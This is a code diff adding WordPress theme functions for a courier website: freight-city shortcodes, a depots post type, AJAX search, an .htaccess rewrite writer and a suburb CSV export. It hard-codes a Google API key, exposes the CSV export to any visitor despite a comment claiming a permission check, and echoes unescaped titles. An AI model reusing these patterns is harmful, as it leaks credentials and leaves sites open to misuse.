+	$city_name = "";
+
+	foreach( $cities as $key => $city ) {
+
+		$curr_number = $key + 1;
+		$city_id = $city->ID;
+
+		if( $city_id == get_the_ID() ) {
+			$index++;
+		}
+
+		if( $curr_number == $index ) {
+			$city_name = $city->post_title;
+			break;
+		}
+	}
+
+	echo ucfirst( $city_name );
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_shortcode("FREIGHTCITYLINK", "freightcitylink_fn");
+function freightcitylink_fn( $atts, $content = null ) {
+	ob_start();
+
+	$a = shortcode_atts( array(
+        'city' => 1,
+    ), $atts );
+
+	$index = $a['city'];
+
+	$cities = get_field( 'frieght_indexing', "option" );
+
+	$city_link = "";
+
+	foreach( $cities as $key => $city ) {
+
+		$curr_number = $key + 1;
+		$city_id = $city->ID;
+
+		if( $city_id == get_the_ID() ) {
+			$index++;
+		}
+
+		if( $curr_number == $index ) {
+			$city_link = get_permalink( $city->ID );
+			break;
+		}
+	}
+
+	echo $city_link;
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_shortcode("SIBLINGFREIGHTCITY", "sibling_freightcity_fn");
+function sibling_freightcity_fn( $atts, $content = null ) {
+	ob_start();
+
+	$a = shortcode_atts( array(
+        'city' => 1,
+    ), $atts );
+
+	$index = $a['city'];
+
+	$cities = get_field( 'frieght_indexing', "option" );
+
+	$city_name = "";
+
+	$post = get_post(get_the_ID());
+	$post_parent = $post->post_parent;
+
+	$cities = get_field( 'child_cities_ordering', $post_parent );
+
+
+
+	foreach( $cities as $key => $city ) {
+
+		$curr_number = $key + 1;
+		$city_id = $city->ID;
+
+		if( $city_id == get_the_ID() || $city_id == $post_parent ) {
+			$index++;
+		}
+
+		if( $curr_number == $index ) {
+			$city_name = get_field( 'current_city_name', $city_id );
+			break;
+		}
+	}
+
+	echo ucfirst( $city_name );
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_shortcode("SIBLINGFREIGHTCITYLINK", "sibling_freightcitylink_fn");
+function sibling_freightcitylink_fn( $atts, $content = null ) {
+	ob_start();
+
+	$a = shortcode_atts( array(
+        'city' => 1,
+    ), $atts );
+
+	$index = $a['city'];
+
+	$cities = get_field( 'frieght_indexing', "option" );
+
+	$city_link = "";
+
+	$post = get_post(get_the_ID());
+	$post_parent = $post->post_parent;
+
+	$cities = get_field( 'child_cities_ordering', $post_parent );
+
+	foreach( $cities as $key => $city ) {
+
+		$curr_number = $key + 1;
+		$city_id = $city->ID;
+
+		if( $city_id == get_the_ID() || $city_id == $post_parent ) {
+			$index++;
+		}
+
+		if( $curr_number == $index ) {
+			$city_link = get_permalink( $city->ID );
+			break;
+		}
+	}
+
+	echo $city_link;
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+
+add_action("admin_footer", "print_fc_admin_style");
+function print_fc_admin_style() {
+	?>
+	<style>
+		.auto-height .acf-relationship .list{
+			  height: unset !important;
+		}
+
+		.acf-flexible-content .acf-actions .disabled{
+			display: none;
+		}
+	</style>
+	<?php
+}
+
+add_filter("acf/fields/relationship/query", "filter_acf_query", 100, 3);
+function filter_acf_query( $args, $field, $post_id ) {
+
+	$post_type = get_post_type($post_id);
+
+	if( $post_type == "freights" && $field['name'] == "child_cities_ordering" ) {
+		$args['post_parent'] = $post_id;
+	}
+
+	return $args;
+}
+
+
+add_action("init", "setup_fc_depots");
+function setup_fc_depots() {
+
+	$labels = array(
+		'name' => 'Depots',
+		'menu_name' => 'Depots'
+	);
+
+	$args = array(
+		'labels'        => $labels,
+		'description'   => 'Depots',
+		'hirarchical'    => false,
+		'public'        => true,
+		'menu_position' => 50,
+		'supports'      => array( 'title'),
+		'has_archive'   => true,
+	);
+	register_post_type( 'depots', $args );
+
+
+	register_taxonomy( 'couriers', 'depots', array(
+        'label'        => __( 'Couriers List', 'textdomain' ),
+        'hierarchical' => true,
+        'show_admin_column' => true,
+    ) );
+}
+
+function my_acf_init() {
+	acf_update_setting('google_api_key', 'AIzaSyDVM688neS-Aqu_IT3iviF2D4J3lNqZobw');
+}
+add_action('acf/init', 'my_acf_init');
+
+add_action( 'pre_get_posts', 'my_change_sort_order');
+function my_change_sort_order($query){
+
+	if( is_tax('couriers') && ! is_admin() ) {
+		$query->set( 'order', 'ASC' );
+		$query->set( 'orderby', 'title' );
+		$query->set( 'posts_per_page', -1 );
+	}
+
+	if( is_post_type_archive('depots') && ! is_admin() ) {
+		$query->set( 'order', 'ASC' );
+		$query->set( 'orderby', 'title' );
+		$query->set( 'posts_per_page', 21 );
+	}
+};
+
+add_action("wp_ajax_search_depots", "search_depots_fn");
+add_action("wp_ajax_nopriv_search_depots", "search_depots_fn");
+function search_depots_fn() {
+
+	$search_text = $_POST['search'] ? $_POST['search'] : "";
+	$taxid = $_POST['taxid'] ? $_POST['taxid'] : "";
+
+	$args = array('post_type' => "depots", 'posts_per_page' => -1, 'post_status' => 'publish', 'orderby' => array("title" => "ASC") );
+	if($search_text) {
+		$args['s'] = $search_text;
+	}
+	if($taxid) {
+		$args['tax_query'] = array(
+			array (
+				'taxonomy' => 'couriers',
+				'field' => 'id',
+				'terms' => array( $taxid ),
+			)
+		);
+	}
+
+	$query = new WP_Query($args );
+
+
+	if ( $query->have_posts() ) {
+		$listings = $query->posts;
+		foreach($listings as $post) {
+			$link = get_permalink($post->ID);
+			$name = $post->post_title;
+			$listing_html .= "<li>";
+				$listing_html .= "<a href='$link' class='bttn'><span>$name</span>
+					<i class='fl-button-icon fl-button-icon-after fas fa-long-arrow-alt-right' aria-hidden='true'></i>
+					</a>";
+			$listing_html .= "</li>";
+		}
+	}
+
+	else{
+		$listing_html .= "<li class='ls-item'>";
+		$listing_html .= "No Items Found";
+		$listing_html .= "</li>";
+	}
+
+	echo json_encode( array ("listing_html" => $listing_html ) );
+	exit;
+}
+
+
+
+
+function get_all_listings_depots($search_text = "", $paged = 1, $per_page = 20) {
+
+	$query_paged = ( get_query_var( 'paged' ) ) ? get_query_var( 'paged' ) : 1;
+	$paged = $paged ? $paged : $query_paged;
+	$args = array('post_type' => "depots", 'posts_per_page' => $per_page, 'paged' => $paged, 'post_status' => 'publish', 'orderby' => array("post_type" => "ASC", "title" => "ASC") );
+
+	if($search_text) {
+		$args['s'] = $search_text;
+	}
+	$query = new WP_Query($args );
+	$return = array();
+	if ( $query->have_posts() ) {
+		$return['posts'] = $query->posts;
+		$return['curr_page'] = $paged;
+		$return['total_page'] = $query->max_num_pages;
+	}
+	return $return;
+}
+
+function create_all_depots_item_html($search_text = "", $paged = 1) {
+
+	$search_text = ! $search_text && isset($_GET['s']) && $_GET['s'] ? $_GET['s'] : $search_text;
+	$listings = get_all_listings_depots( $search_text, $paged );
+	$pagination_html = "";
+	if( $listings && $listings['posts'] ) {
+		foreach($listings['posts'] as $post) {
+			$link = get_permalink($post->ID);
+			$name = $post->post_title;
+			$listing_html .= "<li>";
+			$listing_html .= "<a href='$link' class='bttn'><span>$name</span>
+								<i class='fl-button-icon fl-button-icon-after fas fa-long-arrow-alt-right' aria-hidden='true'></i>
+								</a>";
+			$listing_html .= "</li>";
+			}
+			$pagination_html .= "<div class='pagination'>";
+			$pagination_html .= paginate_links( array(
+				'base'         => get_all_cities_page_link().'?paged=%#%&search='.$search_text,
+				'total'        => $listings['total_page'],
+				'current'      => $listings['curr_page'],
+				'format'       => '?paged=%#%',
+				'type'         => 'plain',
+				'prev_next'    => false,
+			));
+		$pagination_html .= "</div>";
+	}
+	else{
+		$listing_html .= "<li class='ls-item'>";
+		$listing_html .= "No Items Found";
+		$listing_html .= "</li>";
+		}
+	return array("listing_html" => $listing_html, "pagination_html" => $pagination_html);
+}
+
+add_action("wp_ajax_search_in_depots", "search_in_depots_fn");
+add_action("wp_ajax_nopriv_search_in_depots", "search_in_depots_fn");
+function search_in_depots_fn() {
+	$search_text = $_POST['search'] ? $_POST['search'] : "";
+	$paged = $_POST['page'] ? $_POST['page'] : 1;
+	$_REQUEST['show_claimed'] = false;
+	$html = create_all_depots_item_html($search_text, $paged);
+	echo json_encode( array ("listing_html" => $html['listing_html'], "pagination_html" => $html['pagination_html']  ) );
+	exit;
+}
+
+
+add_shortcode("CURRENTPAGETITLE", "currentpagetitle_fn");
+function currentpagetitle_fn( $atts, $content = null ) {
+	ob_start();
+
+	$a = shortcode_atts( array(
+        'plural' => 1,
+    ), $atts );
+
+	$plural = $a['plural'];
+	$city_name = get_the_title();
+	echo ucfirst( $city_name );
+
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_filter( 'use_widgets_block_editor', '__return_false' );
+add_filter( 'widget_text', 'do_shortcode' );
+
+add_filter("permalink_manager_filter_redirect", "permalink_manager_filter_redirect_fn", 10, 3);
+function permalink_manager_filter_redirect_fn($correct_permalink, $redirect_type, $queried_object) {
+
+	if( is_page('blog') ) {
+		$correct_permalink = "";
+	}
+
+	return $correct_permalink;
+}
+
+
+function get_custom_htaccess_rules() {
+	$rule = '<IfModule mod_rewrite.c>
+		RewriteEngine On
+		RewriteCond %{REQUEST_FILENAME} !-d
+		RewriteRule ^(.*)/$ https://fastcourier.com.au/$1 [L,R=301]
+		</IfModule>';
+
+	return $rule;
+}
+
+add_action( "init", "set_htaccess" );
+function set_htaccess() {
+
+	if( ! isset ( $_GET['set_htaccess'] ) ) {
+		// return;
+	}
+
+	$home_path = get_home_path();
+	$htaccess = $home_path.'.htaccess';
+
+	$code = get_custom_htaccess_rules();
+
+	$existing_content =  file_get_contents($htaccess);
+
+	// echo trim($code) . "\n" . $existing_content;
+
+	$find_code = 'RewriteRule ^(.*)/$ https://fastcourier.com.au/$1 [L,R=301]';
+
+	$pos = strpos( $existing_content, $code);
+
+	if( $pos === false ) {
+		file_put_contents($htaccess, trim($code) . "\n" . $existing_content, LOCK_EX);
+	}
+}
+
+
+function year_shortcode () {
+	$year = date_i18n ('Y');
+	return $year;
+}
+add_shortcode ('current_year', 'year_shortcode');
+
+
+
+/* Get All Lisitings with Pagination */
+add_shortcode("suburb-categories", "suburb_categories_shortcode");
+function suburb_categories_shortcode( $atts, $content = null ) {
+	ob_start();
+
+	$args = array(
+		'post_type' => array("city", "suburb"),
+		'posts_per_page' => $per_page,
+		'paged' => $paged,
+		'post_status' => 'publish',
+		'orderby' => array("post_type" => "ASC", "title" => "ASC")
+	);
+
+	global $wpdb;
+	$posts = $wpdb->prefix . 'posts';
+	$query = "SELECT post_title FROM $posts WHERE post_type IN ('city', 'suburb') AND post_status = 'publish' ORDER BY post_type ASC, post_title ASC ";
+	$results = $wpdb->get_col($query);
+
+	$groupedArray = array_chunk($results, 20);
+	$page = 1;
+	$first_name = '';
+
+	$list_array = array();
+
+	foreach( $groupedArray as $key => $cities ) {
+
+		$first_name = $cities[0];
+		$last_name = end($cities);
+
+		$index = $key + 1;
+		$link = site_url() . '/all-cities?paged=' . $index;
+		$list_array[] = "<li><a href='$link'>Suburbs Page $index: " . $first_name . ' To ' . $last_name.'</a></li>';
+	}
+
+	$link = site_url() . '/all-cities';
+	$list_array[0] = "<li><a href='$link'>Suburbs Page 1: Major Cities</a></li>";
+
+	echo '<ul class="suburb-list">';
+		foreach( $list_array as $html ) {
+			echo $html;
+		}
+	echo '</ul>';
+
+	// echo "<pre>"; print_r($list_array); echo "</pre>";
+
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+
+function vc_remove_wp_ver_css_js( $src ) {
+	if ( strpos( $src, 'ver=' . get_bloginfo( 'version' ) ) )
+		$src = remove_query_arg( 'ver', $src );
+	return $src;
+}
+add_filter( 'style_loader_src', 'vc_remove_wp_ver_css_js', 9999 );
+add_filter( 'script_loader_src', 'vc_remove_wp_ver_css_js', 9999 );
+
+
+
+
+
+add_filter( 'astra_tablet_breakpoint', function() {
+    return 1200;
+});
+
+
+
+// Define your shortcode function
+function tax_shortcode_top($atts, $content = null) {
+    // Start output buffering
+    ob_start();
+	
+	$description = get_the_archive_description();
+	?>
+	
+	<section class="gradient-sec top-hero">
+		<div class="container-w">
+			<div class="row">
+				<div class="full-col">
+					<div class="left-sec">
+						<h1><?php echo single_term_title(); ?> </h1>
+						<?php if ( $description ) { ?>
+							<h4 class="archive-description"><?php echo wp_kses_post( wpautop( $description ) ); ?></h4>
+						<?php } ?>
+					</div>
+				</div>         
+			</div>
+		</div>
+	</section>
+	
+	<?php   
+    $output = ob_get_clean();
+	// Return the output
+    return $output;
+}
+add_shortcode('tax_shortcode_top', 'tax_shortcode_top');
+
+
+
+
+
+
+// Register the function to be called during WordPress initialization
+add_action('init', 'generate_suburb_csv');
+
+// Function to generate CSV for suburb post type
+function generate_suburb_csv() {
+    // Check if it's the admin area and if the user has permissions
+    if ( isset($_GET['dwncsv'] ) ) {
+        // Include WordPress Filesystem API
+        include_once ABSPATH . 'wp-admin/includes/file.php';
+
+        // Fetch all posts of 'suburb' post type
+        $args = array(
+            'post_type' => 'suburb',
+            'posts_per_page' => -1, // Retrieve all posts
+			'orderby' => 'post_title'
+        );
+        $suburb_posts = get_posts($args);
+
+        if ($suburb_posts) {
+            // Prepare CSV data
+            $csv_data = "Post Title,Postcode\n";
+
+            // Loop through each post and retrieve post title and postcode meta
+            foreach ($suburb_posts as $post) {
+                $post_title = $post->post_title;
+                $postcode = get_post_meta($post->ID, 'postcode', true);
+
+                // Add post title and postcode to CSV data
+                $csv_data .= '"' . $post_title . '","' . $postcode . "\"\n";
+            }
+
+            // Set CSV file path
+            $csv_file_path = WP_CONTENT_DIR . '/suburb_data.csv';
+
+            // Write CSV data to a file
+            WP_Filesystem();
+            global $wp_filesystem;
+            if ($wp_filesystem) {
+                $wp_filesystem->put_contents($csv_file_path, $csv_data, FS_CHMOD_FILE);
+
+                // Download the CSV file
+                header("Content-type: text/csv");
+                header("Content-Disposition: attachment; filename=suburb_data.csv");
+                readfile($csv_file_path);
+                exit();
+            }
+        }
+    }
+}
